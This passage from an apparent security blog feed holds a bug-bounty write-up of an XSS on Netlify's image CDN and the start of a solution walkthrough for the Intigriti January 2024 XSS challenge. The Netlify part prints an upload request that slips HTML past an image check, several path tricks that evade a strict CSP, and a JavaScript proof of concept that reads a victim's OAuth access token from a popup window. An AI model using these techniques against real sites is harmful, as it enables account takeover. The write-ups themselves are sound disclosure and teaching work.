src="https://cdn-images-1.medium.com/max/1000/0*HJQdly5yptzZvM07" /></figure><p>And voilla we now have a working xss in the CDN domain, I thought now it would easy to get xss in the /.netlify/images?url= endpoint</p><p>But we hit a bummer!! Even though the Content-Type is text/html and the response body contains the xss payload it won‚Äôt trigger and is pretty useless due to the <strong><em>CSP </em></strong>being¬†used.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1000/0*Hq_tR9iBzjXHEWfp" /></figure><pre>Content-Security-Policy: script-src &#39;none&#39;</pre><p>This is the CSP which is being used in this endpoint, as I already mentioned this before it‚Äôs impossible to bypass this csp. It‚Äôs super strict, leaves no room for any bypasses.</p><p>I lost my hope and was about to give up. But next morning I had a random thought, I have been testing Netlify for a couple of days now so had a good idea about their application and¬†all.</p><p>For other endpoints also they have CSP but it‚Äôs very relax¬†, in simple terms that one is easy to bypass but this /.netlify/images?url= endpoint returned a different very strict¬†CSP.</p><p>So on the backend side they must be checking the path of the requested url and serving a different CSP especially for it. Just an example nginx conf of how this might be happening</p><pre>    location /.netlify/images {<br>        # Set Content Security Policy<br>        add_header Content-Security-Policy &quot;script-src &#39;none&#39;&quot;;</pre><p>What if there are any URL parsing confusion b/w the service responsible for serving CSP and the service related to fetching the resource. If this is true can I take advantage of¬†it?</p><p>If I can provide a path such that it doesn‚Äôt matches with the location directive so nginx isn‚Äôt able to catch that but the backend service normalizes the path and treats it as /.netlify/images only so a proper response is returned which doesn‚Äôt have the strict¬†CSP</p><p>I started playing with the¬†path</p><pre>GET /./.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x HTTP/2<br>Host: app.netlify.com</pre><p>Response:</p><pre>HTTP/2 200 OK<br><br>Content-Security-Policy: script-src &#39;nonce-ak9jJ87J3kkfSFdbapb1h7sEJ/RjVtSQ&#39; &#39;strict-dynamic&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; &#39;self&#39; https: http: &#39;none&#39;; report-uri /.netlify/functions/__csp-violations<br>Content-Type: text/html</pre><p>Nice the theory really works, I was able to make it return a different CSP but with the same response. But /./.netlify/images if I use such a path in browser it would normalize the url to /.netlify/images before making the request to the¬†sevrer</p><p>Then I tried some url encoding stuff /.netlify%2fimages and this worked perfectly fine I was able to get¬†<strong>xss</strong></p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/0*kXcUxk99-yPy0vvB" /></figure><p>Used a simple poc as this to leak the authorization code from the Github Oauth¬†flow</p><pre>x = window.open(&quot;https://api.netlify.com/auth?provider=github&amp;site_id=app.netlify.com&amp;login=true&amp;redirect=https://app.netlify.com/&quot;);<br><br>setInterval(function() {<br>    console.log(x.location.href);<br>}, 500);</pre><p>I could use this url with the access_tokento login to victim‚Äôs account as the access_token in the query param is basically their main session¬†cookie.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/0*6oJjIZ_sMGYgNYHU" /></figure><p>They tried fixing it but soon enough I found another bypass, by just adding a / before the path I was able to bypass the¬†CSP:</p><pre>//.netlify/images</pre><p>This bypass still works you can try playing with the endpoint¬†here</p><p><a href="https://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x">https://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x</a></p><p>The url is pointing to an old uploaded html file, Netlify fixed the issue by disallowing the upload of arbitrary files on their CDN Domain and left the url parser bug as it is. As you no longer have a way to upload arbitrary file which can lead to xss they consider this issue to be fixed ¬Ø\_(„ÉÑ)_/¬Ø</p><p>I hope you liked the writeup, next time you had to deal with a strict csp maybe try playing with the path and see if you can make the server return a relaxed csp or something which might be easier to bypass than the original one and you can get lucky like me¬†:)</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=755a27065fd9" width="1" height="1" alt=""><hr><p><a href="https://infosecwriteups.com/bypassing-csp-via-url-parser-confusions-xss-on-netlifys-image-cdn-755a27065fd9">Bypassing CSP via URL Parser Confusions¬†: XSS on Netlify‚Äôs Image CDN</a> was originally published in <a href="https://infosecwriteups.com">InfoSec Write-ups</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="bug-bounty" /><category term="csp" /><category term="xss-attack" /><summary type="html"><![CDATA[Bypassing CSP via URL Parser Confusions¬†: XSS on Netlify‚Äôs Image¬†CDNHeyyy Everyonee,In this blogpost I am going to talk about my finding which was a XSS on Netlify‚Äôs Image CDN used in https://app.netlify.com and how I managed to bypass this CSP Content-Security-Policy: script-src ‚Äònone‚Äô (for those of you who aren‚Äôt much familiar with this CSP¬†, in simple terms it means no script execution will be there in any case) along with that some other things which can be applied on other sites also which are using Netlify‚Äôs Image CDN¬†, for those of you unfamiliar with what it is would recommend reading this¬†article:Netlify Image CDNIn short many popular Static Site Generators have this Image CDN functionality where they optimize the images used on the website. This is useful in cases where you want to make the site load faster by reducing the time taken for loading images as less as possible.Some examples of this¬†are:Optimizing: Images | Next.jsNuxt Image: Optimized Images for your Nuxt AppsPreoptimizing Your Images | GatsbyAll these have the same goal where they take a url as an input either via a parmeter or from the path and optimize the image. A lot of stuff goes behind the scene when you make a request to such endpoint, if you are interested luckily all of them are open source so you can take a deep dive and maybe find some cool¬†bugs./_next/image?url=/_gatsby/image/:url/.netlify/image?url=/_ipx/w_200/:urlAlso you will find these endpoints will often have some checks in place like which url you are allowed to make requests to which is all configurable as per the docs. They aslo validate the Content-Type of the requested image, like image/svg+xml as it could allow xss and other checks to like checking the response buffer too¬†, to make sure the requested image url is really is an image or not before serving the response¬†back.Some don‚Äôt do any checks for images and even allow you to serve html response via this endpoint, as the requested url is fetched server side not client side it can also be good candidate for SSRF (I am not just bluffing all these some cool hackers have proved all these things are possible) like they were able to bypass the domain check to make request to any url or get xss or even Full read¬†SSRFIt‚Äôs a really interesting attack surface after seeing some awesome research done by Assetnote and Sam Curry in the past on this, I decided to look into them as well¬†, so far have some interesting leads which I hope can be turned into a bug maybe. But well that‚Äôs a different topic if I did find something, will make sure to write a blog about¬†it.Exploiting Web3&#39;s Hidden Attack Surface: Universal XSS on Netlify&#39;s Next.js LibraryExploiting Static Site Generators: When Static Is Not Actually StaticEnough background details now back to the finding,so sites built on Netlify has this Image Optimization endpoint/.netlify/images?url=An example url can be this: https://app.netlify.com/.netlify/images?url=https://app.netlify.com/favicon.icoThere are some more parameters which can also be used to return the image with a different width or height,etc. The url parameter only allows you to fetch files from whitelisted hosts only, this hosts can be configured via the netlify.toml file[images] remote_images = [ &quot;https://my-images.com/.*&quot;, &quot;https://animals.more-images.com/[bcr]at/.*&quot;]By default the same origin urls are also accepted in the url parameter. You can see in the above config¬†, it makes the use of regex also¬†.*so even little mistakes can have some side effects¬†there.As earlier I told some providers don‚Äôt do any check on this whether the requested url returns a valid image or not this is in the case of¬†Netlify.So you can even do thing like this, here I am requesting the Index page, the response for the requested url is fetched server side (some weird thing can here happen too, maybe ssrf if the config allows making request to any url¬†)In case of https://app.netlify.com¬†, the following CDN domain was in the whitelist https://d33wubrfki0l68.cloudfront.net. They use this CDN to host all the user uploaded contents such as profile picture,etcI had this thought in my mind, if I could find arbitrary file upload on the CDN domain I could use that here in the /.netlify/image?url endpoint and get XSS¬†?Indeed there was some checks to make sure the user can‚Äôt upload anything else but images. I tried SVG but it didn‚Äôt allowed¬†it.{&quot;code&quot;:422,&quot;message&quot;:&quot;Logo must be an image&quot;}I found a bypass for this easily¬†, which allowed me to upload any files to the cdn domain.By setting the Content-Type: image/png mimetype for the uploaded file to be one of the whitelisted ones it allowed to bypass the¬†checkPOST /access-control/bb-api/api/v1/accounts/5d77dc9150223b44a44df1f3/logo HTTP/2Host: app.netlify.comCookie: RedactedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: multipart/form-data; boundary=---------------------------26024016321888288818835600843Referer: https://app.netlify.com/teams/sudi/overviewContent-Length: 606Origin: https://app.netlify.comSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originTe: trailers-----------------------------26024016321888288818835600843Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xss.html&quot;Content-Type: image/png&lt;h1&gt;shirley&lt;/h1&gt;&lt;script&gt;alert()&lt;/script&gt;-----------------------------26024016321888288818835600843--{ &quot;url&quot;: &quot;https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&quot;}As you can see we recieved a successful response, with url which has the¬†.html extension. Now let‚Äôs check the Content-Type of the response¬†..And voilla we now have a working xss in the CDN domain, I thought now it would easy to get xss in the /.netlify/images?url= endpointBut we hit a bummer!! Even though the Content-Type is text/html and the response body contains the xss payload it won‚Äôt trigger and is pretty useless due to the CSP being¬†used.Content-Security-Policy: script-src &#39;none&#39;This is the CSP which is being used in this endpoint, as I already mentioned this before it‚Äôs impossible to bypass this csp. It‚Äôs super strict, leaves no room for any bypasses.I lost my hope and was about to give up. But next morning I had a random thought, I have been testing Netlify for a couple of days now so had a good idea about their application and¬†all.For other endpoints also they have CSP but it‚Äôs very relax¬†, in simple terms that one is easy to bypass but this /.netlify/images?url= endpoint returned a different very strict¬†CSP.So on the backend side they must be checking the path of the requested url and serving a different CSP especially for it. Just an example nginx conf of how this might be happening location /.netlify/images { # Set Content Security Policy add_header Content-Security-Policy &quot;script-src &#39;none&#39;&quot;;What if there are any URL parsing confusion b/w the service responsible for serving CSP and the service related to fetching the resource. If this is true can I take advantage of¬†it?If I can provide a path such that it doesn‚Äôt matches with the location directive so nginx isn‚Äôt able to catch that but the backend service normalizes the path and treats it as /.netlify/images only so a proper response is returned which doesn‚Äôt have the strict¬†CSPI started playing with the¬†pathGET /./.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x HTTP/2Host: app.netlify.comResponse:HTTP/2 200 OKContent-Security-Policy: script-src &#39;nonce-ak9jJ87J3kkfSFdbapb1h7sEJ/RjVtSQ&#39; &#39;strict-dynamic&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; &#39;self&#39; https: http: &#39;none&#39;; report-uri /.netlify/functions/__csp-violationsContent-Type: text/htmlNice the theory really works, I was able to make it return a different CSP but with the same response. But /./.netlify/images if I use such a path in browser it would normalize the url to /.netlify/images before making the request to the¬†sevrerThen I tried some url encoding stuff /.netlify%2fimages and this worked perfectly fine I was able to get¬†xssUsed a simple poc as this to leak the authorization code from the Github Oauth¬†flowx = window.open(&quot;https://api.netlify.com/auth?provider=github&amp;site_id=app.netlify.com&amp;login=true&amp;redirect=https://app.netlify.com/&quot;);setInterval(function() { console.log(x.location.href);}, 500);I could use this url with the access_tokento login to victim‚Äôs account as the access_token in the query param is basically their main session¬†cookie.They tried fixing it but soon enough I found another bypass, by just adding a / before the path I was able to bypass the¬†CSP://.netlify/imagesThis bypass still works you can try playing with the endpoint¬†herehttps://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=xThe url is pointing to an old uploaded html file, Netlify fixed the issue by disallowing the upload of arbitrary files on their CDN Domain and left the url parser bug as it is. As you no longer have a way to upload arbitrary file which can lead to xss they consider this issue to be fixed ¬Ø\_(„ÉÑ)_/¬ØI hope you liked the writeup, next time you had to deal with a strict csp maybe try playing with the path and see if you can make the server return a relaxed csp or something which might be easier to bypass than the original one and you can get lucky like me¬†:)Bypassing CSP via URL Parser Confusions¬†: XSS on Netlify‚Äôs Image CDN was originally published in InfoSec Write-ups on Medium, where people are continuing the conversation by highlighting and responding to this story.]]></summary></entry><entry><title type="html">Intigriti Xss Challenge Jan 2024 Solution</title><link href="http://localhost:4000/2024/01/17/Intigriti-XSS-Challenge-Jan-2024-Solution.html" rel="alternate" type="text/html" title="Intigriti Xss Challenge Jan 2024 Solution" /><published>2024-01-17T00:00:00+05:30</published><updated>2024-01-17T00:00:00+05:30</updated><id>http://localhost:4000/2024/01/17/Intigriti-XSS-Challenge-Jan-2024-Solution</id><content type="html" xml:base="http://localhost:4000/2024/01/17/Intigriti-XSS-Challenge-Jan-2024-Solution.html"><![CDATA[<p>Mizu put another great xss challenge at the start of this year, so I went all in to solve it this time finally :p</p>

<p>The source for this challenge was provided: https://challenge-0124.intigriti.io/static/source.zip</p>

<p>The routes are defined in \src\app.js</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">index</span><span class="dl">"</span><span class="p">);</span>
	<span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="p">{</span> <span class="na">SANITIZE_DOM</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}),</span>
        <span class="na">search</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">search</span>
    <span class="p">});</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">q</span><span class="p">;</span>
    <span class="nx">repo</span> <span class="o">=</span> <span class="p">{};</span>

    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">item</span> <span class="k">of</span> <span class="nx">repos</span><span class="p">.</span><span class="nx">items</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span> <span class="o">&amp;&amp;</span> <span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">name</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">repo</span> <span class="o">=</span> <span class="nx">item</span>
	    <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">repo</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>

<p>The two relevant onces are this.</p>

<p>For the first index root, it takes the value from the query parameters <code class="language-plaintext highlighter-rouge">name</code> and <code class="language-plaintext highlighter-rouge">search</code> which are passed to the render method. Sanitization is being done on name parameter via dompurify so no easy xss there.</p>

<p>Those parameters values are used in the search.ejs template</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;%-</span> <span class="nf">include</span><span class="p">(</span><span class="dl">"</span><span class="s2">inc/header</span><span class="dl">"</span><span class="p">);</span> <span class="o">%&gt;</span>
<span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Hey</span> <span class="o">&lt;%-</span> <span class="nx">name</span> <span class="o">%&gt;</span><span class="p">,</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="nx">Which</span> <span class="nx">repo</span> <span class="nx">are</span> <span class="nx">you</span> <span class="nx">looking</span> <span class="k">for</span><span class="p">?</span><span class="o">&lt;</span><span class="sr">/h2</span><span class="err">&gt;
</span>
<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">q</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;%= search %&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
</span>
<span class="o">&lt;</span><span class="nx">hr</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/static/img/loading.gif</span><span class="dl">"</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">loading</span><span class="dl">"</span> <span class="nx">width</span><span class="o">=</span><span class="dl">"</span><span class="s2">50px</span><span class="dl">"</span> <span class="nx">hidden</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">img</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">avatar</span><span class="dl">"</span> <span class="nx">width</span><span class="o">=</span><span class="dl">"</span><span class="s2">35%</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">p</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">homepage</span><span class="dl">"</span> <span class="nx">hidden</span><span class="o">&gt;&lt;</span><span class="sr">/iframe</span><span class="err">&gt;
</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/static/js/axios.min.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/static/js/jquery-3.7.1.min.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
    <span class="kd">function</span> <span class="nf">search</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>

        <span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
        <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">d</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">repo</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Not found!</span><span class="dl">"</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">};</span>

            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
                <span class="p">});</span>
            <span class="p">};</span>
        <span class="p">});</span>
    <span class="p">};</span>

    <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="p">))</span> <span class="nf">search</span><span class="p">();</span>

        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">submit</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
            <span class="nf">search</span><span class="p">();</span>
        <span class="p">});</span>
    <span class="p">};</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span>
</code></pre></div></div>

<p>The value from <code class="language-plaintext highlighter-rouge">name</code> parameter (sanitized using dompurify) is placed here:</p>

<pre><code class="language-ejs">&lt;h2&gt;Hey &lt;%- name %&gt;,&lt;br&gt;Which repo are you looking for?&lt;/h2&gt;
</code></pre>

<p>From ejs docs https://ejs.co/#docs
<code class="language-plaintext highlighter-rouge">&lt;%-</code> Outputs the unescaped value into the template, so this is clearly a html injection bug (no xss due to use of dompurify)</p>

<pre><code class="language-ejs">&lt;input name="q" value="&lt;%= search %&gt;"&gt;
</code></pre>
<p><code class="language-plaintext highlighter-rouge">search</code> parameter value is safe from html injection: <code class="language-plaintext highlighter-rouge">&lt;%=</code> Outputs the value into the template (HTML escaped)</p>

<p>The same can be verified from this url: https://challenge-0124.intigriti.io/challenge?name=shirley%3Cimg%20src=x%3E&amp;search=shirley%22%3E%3Cimg%20src=x%3E
<img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/60261d43-9364-4fa4-9b4c-ca12f575b20d" alt="image" /></p>

<p>Moving on to the script block, it loads two things axios and jquery.The version of jquery is mentioned but axios isn‚Äôt.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">function</span> <span class="nf">search</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>

        <span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
        <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">d</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">repo</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Not found!</span><span class="dl">"</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">};</span>

            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
                <span class="p">});</span>
            <span class="p">};</span>
        <span class="p">});</span>
    <span class="p">};</span>

    <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="p">))</span> <span class="nf">search</span><span class="p">();</span>

        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">submit</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
